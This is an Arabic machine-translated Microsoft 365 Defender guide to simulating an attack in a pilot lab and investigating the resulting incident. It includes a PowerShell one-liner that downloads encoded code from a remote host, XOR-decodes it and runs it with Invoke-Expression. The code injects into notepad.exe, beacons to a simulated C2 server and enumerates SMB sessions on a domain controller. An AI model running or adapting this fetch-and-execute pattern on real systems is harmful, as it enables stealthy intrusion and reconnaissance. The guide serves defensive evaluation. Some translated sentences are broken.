---
title: تشغيل محاكاة هجوم في بيئة تجريبية Microsoft 365 Defender التشغيل
description: يمكنك تشغيل عمليات محاكاة الهجمات Microsoft 365 Defender لمعرفة كيفية تقديم التنبيهات والحوادث، واكتسبت تحليلات، وسرعة معالجة التهديدات.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: bf7592055e58f10a3680e6ee712c597780591a47
ms.sourcegitcommit: 3b8e009ea1ce928505b8fc3b8926021fb91155f3
ms.translationtype: MT
ms.contentlocale: ar-SA
ms.lasthandoff: 03/28/2022
ms.locfileid: "64498572"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>تشغيل محاكاة هجوم في بيئة تجريبية Microsoft 365 Defender التشغيل


هذه المقالة هي [الخطوة 1 من 2](eval-defender-investigate-respond.md) في عملية إجراء تحقيق والاستجابة لحادث في Microsoft 365 Defender بيئة تجريبية. لمزيد من المعلومات حول هذه العملية، راجع [مقالة النظرة](eval-defender-investigate-respond.md) العامة.

بعد إعداد بيئة التجربة[](eval-defender-investigate-respond.md)، حان الوقت لاختبار استجابة Microsoft 365 Defender لحادث وإمكانيات المعالجة والتقصي التلقائي من خلال إنشاء حادث بهجمة محاكاة واستخدام مدخل Microsoft 365 Defender للتحقق والرد.

إن حادث Microsoft 365 Defender هو مجموعة من التنبيهات المرتبطة والبيانات المقترنة بها التي تكو رواية هجوم.

Microsoft 365 الخدمات والتطبيقات تنبيهات عندما تكتشف حدثا أو نشاطا مريبا أو ضارا. توفر التنبيهات الفردية دلائل قيمة حول هجوم مكتمل أو جار. ومع ذلك، تستخدم الهجمات عادة أساليب مختلفة ضد أنواع مختلفة من الكيانات، مثل الأجهزة والمستخدمين علب البريد. النتيجة هي تنبيهات متعددة لكيانات متعددة في المستأجر.

>[!Note]
>إذا كنت حديث العهد بتحليل الأمان والاستجابة للحوادث، فراجع معاينة [](first-incident-overview.md) الاستجابة للحوادث الأولى للحصول على جولة إرشادية لعملية نموذجية للتحليل والرد ومراجعة ما بعد الحادث.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>محاكاة الهجمات باستخدام مدخل Microsoft 365 Defender

لقد Microsoft 365 Defender المدخل قدرات مضمنة لإنشاء هجمات محاكاة على بيئة التجربة:

- تدريب محاكاة الهجمات Microsoft 365 Defender Office 365 في [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  في مدخل Microsoft 365 Defender، حدد البريد الإلكتروني & **التعاون > التدريب على محاكاة الهجمات**.

- برامج تعليمية للهجوم & عمليات محاكاة Microsoft 365 Defender نقطة النهاية في [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  في مدخل <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender،</a> حدد نقاط النهاية > **التعليمية & المحاكاة**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender لـ Office 365 التدريب على محاكاة الهجمات

Defender لـ Office 365 مع Microsoft 365 E5 أو Microsoft Defender لـ Office 365 الخطة 2 التدريب على محاكاة الهجمات لهجمات التصيد الاحتيالي. الخطوات الأساسية هي:

1. إنشاء محاكاة

   للحصول على إرشادات مفصلة خطوة بخطوة حول كيفية إنشاء محاكاة جديدة وإطلاقها، راجع [محاكاة هجوم تصيد احتيالي](/microsoft-365/security/office-365-security/attack-simulation-training).

2. إنشاء تحميل

   للحصول على إرشادات مفصلة خطوة بخطوة حول كيفية إنشاء تحميل للاستخدام في عملية محاكاة، راجع إنشاء تحميل مخصص للتدريب [على محاكاة الهجمات](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. الحصول على تحليلات

   للحصول على إرشادات مفصلة خطوة بخطوة حول كيفية الحصول على تحليلات مع إعداد التقارير، راجع [الحصول على تحليلات من خلال التدريب على محاكاة الهجمات](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

لمزيد من المعلومات، راجع [عمليات المحاكاة](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Defender for Endpoint attack tutorials & محاكاة

فيما يلي عمليات محاكاة Defender for Endpoint من Microsoft:

- المستند ينسدل إلى الخلف
- التحقيق التلقائي (backdoor)

هناك عمليات محاكاة إضافية من مصادر جهة خارجية. هناك أيضا مجموعة من البرامج التعليمية.

لكل محاكاة أو برنامج تعليمي:

1. قم بتنزيل المستند الذي تم توفيره وقراءته.

2. قم بتنزيل ملف المحاكاة. يمكنك اختيار تنزيل الملف أو البرنامج النصي على جهاز الاختبار ولكنه ليس إلزاميا.

3. تشغيل ملف المحاكاة أو البرنامج النصي على جهاز الاختبار كما هو مرشاد في المستند التدريبي.

 لمزيد من المعلومات، راجع [تجربة Microsoft Defender لنقطة النهاية هجوم محاكاة](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>محاكاة هجوم باستخدام وحدة تحكم مجال معزولة والجهاز العميل (اختياري)

في هذا التمرين الاختياري للاستجابة للحوادث، ستمحاكاة هجوم على وحدة تحكم معزولة في مجال خدمات مجال Active Directory (AD DS) وعلى جهاز Windows باستخدام برنامج PowerShell النصي، ثم تحقق من الحادث وتحله وتحله.

أولا، تحتاج إلى إضافة نقاط نهاية إلى بيئة التجربة.

### <a name="add-pilot-environment-endpoints"></a>إضافة نقاط نهاية بيئة تجريبية

أولا، تحتاج إلى إضافة وحدة تحكم معزولة لمجال AD DS Windows إلى بيئة التجربة.

1. تحقق من تمكين المستأجر التجريبي لبيئة [Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. تحقق من وحدة التحكم بالمجال:

   - يتم Windows Server 2008 R2 أو إصدار أحدث.
   - التقارير [Microsoft Defender for Identity وقد](/azure/security-center/security-center-wdatp) مكنت [الإدارة عن بعد](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - تم [Microsoft Defender for Identity Microsoft Defender for Cloud Apps التكامل](/cloud-app-security/mdi-integration).
   - لديه مستخدم اختباري تم إنشاؤه في مجال الاختبار. لا حاجة إلى الأذونات على مستوى المسؤول.

3. تحقق من أن جهاز الاختبار الخاص بك:

   - يتم Windows 10 الإصدار 1903 أو إصدار أحدث.
   - انضم إلى مجال وحدة تحكم مجال AD DS.
   - تم [برنامج الحماية من الفيروسات لـ Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). إذا كنت تواجه مشكلة في تمكين برنامج الحماية من الفيروسات لـ Windows Defender، فشاهد موضوع استكشاف الأخطاء [وإصلاحها هذا](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - تم [التكهين Microsoft Defender لنقطة النهاية](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

إذا كنت تستخدم مجموعات المستأجرين والجهاز، فنشئ مجموعة أجهزة مخصصة لجهاز الاختبار وادفعها إلى المستوى الأعلى.

هناك بديل وهو استضافة وحدة التحكم في مجال AD DS واختبار الجهاز كآلات ظاهرية في خدمات البنية الأساسية ل Microsoft Azure. يمكنك استخدام الإرشادات في المرحلة [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) من دليل اختبار اختبار المؤسسة الذي تم محاكاته، ولكن تخطي إنشاء الجهاز الظاهري APP1.

إليك النتيجة.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="بيئة التقييم باستخدام دليل مختبر الاختبار الخاص بالمؤسسة الذي تم محاكاته" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

ستمحاكاة هجوم متطورة تستفيد من التقنيات المتقدمة لإخفاء البيانات من الكشف. يقوم هجوم تعداد جلسات كتلة رسائل الخادم المفتوحة (SMB) على وحدات التحكم بالمجال واسترداد عناوين IP الأخيرة للأجهزة الخاصة بالمستخدمين. لا تتضمن هذه الفئة من الهجمات عادة الملفات التي يتم إسقاطها على جهاز الضحيه، وهي تحدث في الذاكرة فقط. فهي "تعيش خارج الأرض" باستخدام الأدوات الإدارية والأدوات النظامية الموجودة وتدخل التعليمات البرمجية الخاصة بها في عمليات النظام لإخفاء تنفيذها. يسمح مثل هذا السلوك لهم بالتجنب من الكشف والمثابرة على الجهاز.

في عملية المحاكاة هذه، يبدأ السيناريو النموذجي لدينا مع برنامج PowerShell النصي. في الواقع، قد يتم خداع المستخدم لتشغيل برنامج نصي أو قد يتم تشغيل البرنامج النصي من اتصال عن بعد بكمبيوتر آخر من جهاز موبوء مسبقا، مما يشير إلى أن المهاجم يحاول التنقل بشكل لاحق في الشبكة. قد يكون الكشف عن هذه البرامج النصية صعبا لأن المسؤولين غالبا ما يقوموا بتشغيل البرامج النصية عن بعد لتنفيذ أنشطة إدارية متنوعة.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="هجوم PowerShell بدون ملف مع عملية بحقن وهجمة إعادة التشابه ل SMB" lightbox="../../media/mtp/mtpdiydiagram.png":::

أثناء عملية المحاكاة، يدخل الهجوم رمز shellcode في عملية تبدو غير مهيئة. يتطلب السيناريو استخدام notepad.exe. لقد اخترنا هذه العملية للمحاكاة، ولكن من المرجح أن يستهدف المهاجمون عملية نظام طويلة الأمد، مثل svchost.exe. بعد ذلك، سيتابع رمز shellcode الاتصال بخادم الأمر والتحكم (C2) الخاص بالمهاجم لتلقي إرشادات حول كيفية المتابعة. يحاول البرنامج النصي تنفيذ استعلامات الاستطلاع مقابل وحدة التحكم بالمجال (DC). تسمح الاستطلاعات للمهاجم ب الحصول على معلومات حول أحدث معلومات تسجيل دخول المستخدم. بمجرد أن يحصل المهاجمون على هذه المعلومات، يمكنهم الانتقال بشكل لاحق في الشبكة للوصول إلى حساب حساس معين

> [!IMPORTANT]
> للحصول على أفضل النتائج، اتبع إرشادات محاكاة الهجمات قدر الإمكان.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>تشغيل محاكاة هجوم وحدة التحكم في مجال AD DS المعزولة

لتشغيل محاكاة سيناريو الهجوم:

1. تأكد من أن بيئة التجربة تتضمن وحدة التحكم في مجال AD DS Windows معزولة.

2. سجل الدخول إلى جهاز الاختبار باستخدام حساب المستخدم الاختباري.

3. افتح نافذة Windows PowerShell على جهاز الاختبار.

4. انسخ برنامج محاكاة البرنامج النصي التالي:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > إذا فتحت هذه المقالة على مستعرض ويب، فقد تواجه مشاكل في نسخ النص الكامل دون فقدان أحرف معينة أو إدخال فواصل سطر إضافية. إذا كان الأمر كذلك، ف قم بتنزيل هذا المستند وافتحه على Adobe Reader.

5. لصق البرنامج النصي المنسوخ وتشغيله في نافذة PowerShell.

> [!NOTE]
> إذا كنت تقوم بتشغيل PowerShell باستخدام بروتوكول سطح المكتب البعيد (RDP)، فاستخدم الأمر نوع نص الحافظة في عميل RDP لأن **مفتاح CTRL-V** hotkey أو أسلوب النقر بيمين قد لا يعمل. في بعض الأحيان لن تقبل الإصدارات الأخيرة من PowerShell هذا الأسلوب، وقد تحتاج إلى النسخ إلى المفكرة في الذاكرة أولا، ونسخها في الجهاز الظاهري، ثم لصقها في PowerShell.

بعد بضع ثوان، سيتم المفكرة التطبيق. سيتم إدخال رمز هجوم محاكاة في المفكرة. احتفظ بالمثيل الذي المفكرة تلقائيا مفتوحا لتجربة السيناريو الكامل.

سيحاول رمز الهجوم الذي تم محاكاته الاتصال إلى عنوان IP خارجي (محاكاة خادم C2)، ثم محاولة الاستطلاع على وحدة التحكم بالمجال من خلال SMB.

سترى هذه الرسالة معروضة على وحدة تحكم PowerShell عند اكتمال هذا البرنامج النصي:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

لرؤية الميزة "حادث والاستجابة التلقائية" في العمل، احتفظ notepad.exe العملية مفتوحة. سترى إيقاف الاستجابة والحادث التلقائي المفكرة العملية.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>التحقق من الحادث في الهجوم الذي تم محاكاته

> [!NOTE]
> قبل أن نستعرض عملية المحاكاة هذه، شاهد الفيديو التالي لمعرفة كيف تساعدك إدارة الحوادث على جمع التنبيهات ذات الصلة معا كجزء من عملية التحقيق، حيث يمكنك العثور عليها في المدخل، وكيف يمكنها مساعدتك في عمليات الأمان:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

عند التبديل إلى طريقة عرض محلل SOC، يمكنك الآن بدء التحقق من الهجوم في مدخل Microsoft 365 Defender.

1. افتح Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">المدخل</a>.

2. من جزء التنقل، حدد & **التنبيهات > الأحداث**.

3. سيظهر الحادث الجديد للهجوم الذي تم محاكاته في قائمة انتظار الأحداث.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="مثال على قائمة انتظار &quot;الأحداث&quot;" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>التحقق من الهجوم كحادثة واحدة

Microsoft 365 Defender ربط التحليلات بتجميع كل التنبيهات ذات الصلة والتحريات من منتجات مختلفة في كيان حادث واحد. من خلال القيام بذلك، Microsoft 365 Defender تعرض قصة هجوم أوسع، مما يسمح لمحلل SOC بفهم التهديدات المعقدة والاستجابة لها.

ترتبط التنبيهات التي يتم إنشاؤها أثناء عملية المحاكاة هذه بالخطر نفسه، ونتيجة لذلك، يتم تجميعها تلقائيا كحادث واحد.

لعرض الحادث:

1. افتح Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">المدخل</a>.

2. من جزء التنقل، حدد & **التنبيهات > الأحداث**.

3. حدد العنصر الجديد بالنقر فوق الدائرة الموجودة على الجانب الأيسر من اسم الحادث. تعرض اللوحة الجانبية معلومات إضافية حول الحادث، بما في ذلك كل التنبيهات ذات الصلة. لكل حادث اسم فريد يصفه استنادا إلى سمات التنبيهات التي يتضمنها.

   يمكن تصفية التنبيهات التي تظهر في لوحة المعلومات استنادا إلى موارد الخدمة: Microsoft Defender for Identity، Microsoft Defender for Cloud Apps، Microsoft Defender لنقطة النهاية، Microsoft 365 Defender، Microsoft Defender لـ Office 365.

3. حدد **فتح صفحة الحادث** للحصول على مزيد من المعلومات حول الحادث.

   في صفحة **الحادث** ، يمكنك رؤية كل التنبيهات والمعلومات المتعلقة بالحادث. تتضمن المعلومات الكيانات والأصول المتدخلة في التنبيه ومصدر الكشف للتنبيهات (مثل Microsoft Defender for Identity أو Microsoft Defender لنقطة النهاية) والسبب الذي يدعو إلى ربطها معا. تظهر مراجعة قائمة تنبيهات الأحداث تقدم الهجوم. من طريقة العرض هذه، يمكنك رؤية التنبيهات الفردية والتحقق منها.

   يمكنك **أيضا النقر فوق** إدارة الحادث من القائمة اليسرى، وضع علامة على الحادث، وتعيينه لنفسك، وإضافة تعليقات.

#### <a name="review-generated-alerts"></a>مراجعة التنبيهات التي تم إنشاؤها

دعنا نطلع على بعض التنبيهات التي تم إنشاؤها أثناء هجوم محاكاة.

> [!NOTE]
> سنتجول في بعض التنبيهات التي تم إنشاؤها أثناء الهجوم الذي تم محاكاته. استنادا إلى إصدار Windows والمنتجات Microsoft 365 Defender التي يتم تشغيلها على جهاز الاختبار، قد ترى المزيد من التنبيهات التي تظهر في ترتيب مختلف قليلا.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="مثال على تنبيه تم إنشاؤه" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>تنبيه: تم ملاحظة عملية مريبة (المصدر: Microsoft Defender لنقطة النهاية)

يستخدم المهاجمون المتقدمون أساليب متطورة وخفية للمثابرة في الذاكرة والاخفاء من أدوات الكشف. إحدى التقنيات الشائعة هي العمل من داخل عملية نظام موثوق بها بدلا من أن تكون قابلة للتنفيذ ضارة، مما يجعل من الصعب على أدوات الكشف وعمليات الأمان اكتشاف التعليمات البرمجية الضارة.

للسماح لمحللين SOC بالقبض على هذه الهجمات المتقدمة، توفر أدوات استشعار الذاكرة العميقة في Microsoft Defender لنقطة النهاية خدمات السحابة لدينا مع رؤية غير مسبوقة لمجموعة متنوعة من أساليب استخدام التعليمات البرمجية عبر العمليات. يوضح الشكل التالي كيفية اكتشاف Defender لنقطة النهاية وتنبيهه حول محاولة إدخال التعليمات البرمجية <i>notepad.exe. </i>

:::image type="content" source="../../media/mtp/fig7.png" alt-text="مثال على التنبيه لحقن رمز يحتمل أن يكون ضارا" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>تنبيه: سلوك غير متوقع لاحظته عملية يتم تشغيلها بدون وسيطات سطر الأوامر (المصدر: Microsoft Defender لنقطة النهاية)

Microsoft Defender لنقطة النهاية الكشف عن الهجمة عادة السمة الأكثر شيوعا لتقنية الهجوم. يضمن هذا الأسلوب الديمومه ويرفع الشريط للمهاجمين للتبديل إلى أساليب أحدث.

نستخدم خوارزميات التعلم على نطاق واسع لإنشاء السلوك العادي للعمليات الشائعة داخل المؤسسة وعلى مستوى العالم ونراقب الحالات التي تظهر فيها هذه العمليات سلوكيات غير طبيعية. غالبا ما تشير هذه السلوكيات الشذوذية إلى أنه تم تقديم تعليمات برمجية دفينة ويتم تشغيلها في عملية أخرى موثوق بها.

بالنسبة لهذا السيناريو <i> ، تظهرnotepad.exe</i> سلوك غير طبيعي، بما في ذلك التواصل مع موقع خارجي. هذه النتيجة مستقلة عن الأسلوب المحدد المستخدم لإدخال التعليمات البرمجية الضارة وتنفيذها.

> [!NOTE]
> نظرا لأن هذا التنبيه يستند إلى نماذج التعلم الآلي التي تتطلب معالجة إضافية للخلف، فقد يستغرق الأمر بعض الوقت قبل أن ترى هذا التنبيه في المدخل.

لاحظ أن تفاصيل التنبيه تتضمن عنوان IP الخارجي، وهو مؤشر يمكنك استخدامه كمؤشر محور لتوسيع التحقيق.

حدد عنوان IP في شجرة عملية التنبيه لعرض صفحة تفاصيل عنوان IP.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="مثال على سلوك غير متوقع بواسطة عملية يتم تشغيلها بدون وسيطات سطر الأوامر" lightbox="../../media/mtp/fig8.png":::

يعرض الشكل التالي صفحة تفاصيل عنوان IP المحددة (النقر فوق عنوان IP في شجرة عملية التنبيه).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="مثال لصفحة تفاصيل عنوان IP" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>تنبيه: استطلاع عنوان IP والمستخدم (SMB) (المصدر: Microsoft Defender for Identity)

يمكن تعداد البيانات باستخدام بروتوكول كتلة رسائل الخادم (SMB) المهاجمين من الحصول على أحدث معلومات تسجيل دخول المستخدم التي تساعدهم على التنقل بشكل لاحق عبر الشبكة للوصول إلى حساب حساس معين.

في عملية الكشف هذه، يتم تشغيل تنبيه عند تشغيل تعداد جلسة عمل SMB مقابل وحدة تحكم المجال.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="مثال على Microsoft Defender for Identity تنبيه المستخدم وعنوان IP" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>مراجعة المخطط الزمني للجهاز باستخدام Microsoft Defender لنقطة النهاية

بعد استكشاف التنبيهات المختلفة في هذا الحادث، انتقل مرة أخرى إلى صفحة الحادث التي قمت بالتحري فيها سابقا. حدد علامة **التبويب** الأجهزة في صفحة الحادث لمراجعة الأجهزة المتدخلة في هذا الحادث كما تم Microsoft Defender لنقطة النهاية Microsoft Defender for Identity.

حدد اسم الجهاز الذي وقع فيه الهجوم، لفتح صفحة الكيان لهذا الجهاز المحدد. في هذه الصفحة، يمكنك رؤية التنبيهات التي تم تشغيلها والأحداث ذات الصلة.

حدد علامة **التبويب** المخطط الزمني لفتح المخطط الزمني للجهاز وعرض كل الأحداث والسلوكيات التي تم ملاحظتها على الجهاز بترتيب زمني، تتقاطع مع التنبيهات التي تم رفعها.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="مثال على المخطط الزمني للجهاز مع السلوكيات" lightbox="../../media/mtp/fig11.png":::

يوفر توسيع بعض السلوكيات الأكثر إثارة للاهتمام تفاصيل مفيدة، مثل أشجار المعالجة.

على سبيل المثال، قم بالتمرير لأسفل حتى تجد حدث التنبيه الذي لاحظته عملية **مريبة**. حدد **powershell.exe** تم notepad.exe حدث معالجة أسفله، لعرض شجرة العملية الكاملة لهذا السلوك ضمن الرسم البياني **لكيانات** الحدث على الجزء الجانبي. استخدم شريط البحث للتصفية إذا لزم الأمر.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="مثال على شجرة المعالجة للسلوك المحدد لإنشاء ملف PowerShell" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>مراجعة معلومات المستخدم باستخدام Microsoft Defender for Cloud Apps

في صفحة الحادث، حدد علامة **التبويب** المستخدمون لعرض قائمة المستخدمين المشاركين في الهجوم. يحتوي الجدول على معلومات إضافية حول كل مستخدم، بما في ذلك درجة أولوية **التحقيق لكل** مستخدم.

حدد اسم المستخدم لفتح صفحة ملف تعريف المستخدم حيث يمكن إجراء مزيد من التحقيق. [اقرأ المزيد حول التحقق من المستخدمين الخطرين](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="صفحة مستخدم Defender for Cloud Apps" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>المعالجة والتحري التلقائي

> [!NOTE]
>قبل أن نطلعك على عملية المحاكاة هذه، شاهد الفيديو التالي لمعرفة ما هو الاختبار الذاتي التلقائي، وأين يمكن العثور عليه في المدخل، وكيف يمكنه مساعدتك في عمليات الأمان:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

انتقل مرة أخرى إلى الحادث في Microsoft 365 Defender المدخل. تعرض **علامة التبويب** "عمليات التحقيق **" في صفحة** "الحادث" عمليات التحقيق التلقائية التي تم تشغيلها بواسطة Microsoft Defender for Identity Microsoft Defender لنقطة النهاية. تعرض لقطة الشاشة أدناه فقط التحقيق التلقائي الذي يتم تشغيله بواسطة Defender for Endpoint. بشكل افتراضي، يقوم Defender for Endpoint تلقائيا بتسهيل النتائج التي تم العثور عليها في قائمة الانتظار، مما يتطلب المعالجة.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="مثال على عمليات التحقيق التلقائية ذات الصلة بالحادث" lightbox="../../media/mtp/fig14.png":::

حدد التنبيه الذي تسبب في فتح التحقيق لفتح **صفحة تفاصيل** التحقيق. سترى التفاصيل التالية:

- التنبيه (التنبيهات) التي كانت السبب في إجراء التحقيق التلقائي.
- المستخدمون والأجهزة التي تم التأثير عليها. إذا تم العثور على مؤشرات على أجهزة إضافية، سيتم إدراج هذه الأجهزة الإضافية أيضا.
- قائمة الأدلة. الوحدات التي تم العثور عليها وتحليلها، مثل الملفات والعمليات والخدمات وبرامج التشغيل وعناوين الشبكة. يتم تحليل هذه الكيانات للحصول على علاقات محتملة بالتنبيه ويتم تصنيفها على أنها ضارة أو ضارة.
- تم العثور على التهديدات. التهديدات المعروفة التي يتم العثور عليها أثناء التحقيق.

> [!NOTE]
> استنادا إلى التوقيت، قد يكون التحقيق التلقائي لا يزال قيد التشغيل. انتظر بضع دقائق حتى تكتمل العملية قبل تجميع الأدلة وتحليلها ومراجعة النتائج. تحديث صفحة **تفاصيل التحقيق** للحصول على النتائج الأخيرة.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="مثال لصفحة تفاصيل التحقيق" lightbox="../../media/mtp/fig15.png":::

أثناء عملية البحث التلقائية، Microsoft Defender لنقطة النهاية إلى notepad.exe العملية، التي تم إدخالها كواد من عمليات التحريك التي تتطلب المعالجة. يوقف Defender for Endpoint تلقائيا عملية المعالجة المريبة كجزء من المعالجة التلقائية.

يمكنك <i> رؤيةnotepad.exeمن </i> قائمة العمليات قيد التشغيل على جهاز الاختبار.

#### <a name="resolve-the-incident"></a>حل الحادث

بعد اكتمال التحقيق وتأكيد المعالجة، يمكنك حل الحادث.

من صفحة **الحادث** ، حدد **إدارة الحادث**. قم بتعيين الحالة إلى **حل الحادث** وحدد **تنبيه True** للتصنيف **واختبار الأمان** لتحديده.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="مثال لصفحة الأحداث مع لوحة &quot;إدارة الحادث&quot; المفتوحة حيث يمكنك النقر فوق المفتاح لحل الحادث" lightbox="../../media/mtp/fig16.png":::

عند حل هذا الحادث، فإنه يحل كل التنبيهات المقترنة في Microsoft 365 Defender المدخل والمداخل ذات الصلة.

يلتف هذا الأمر مع عمليات محاكاة الهجمات لتحليل الأحداث، والتحري التلقائي، وحل الحوادث.

## <a name="next-step"></a>الخطوة التالية

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="قدرات Microsoft 365 Defender الاستجابة للحوادث" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

الخطوة 2 من 2: [تجربة Microsoft 365 Defender الاستجابة للحوادث](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>التنقل الذي قد تحتاج إليه

[إنشاء Microsoft 365 Defender التقييم](eval-create-eval-environment.md)
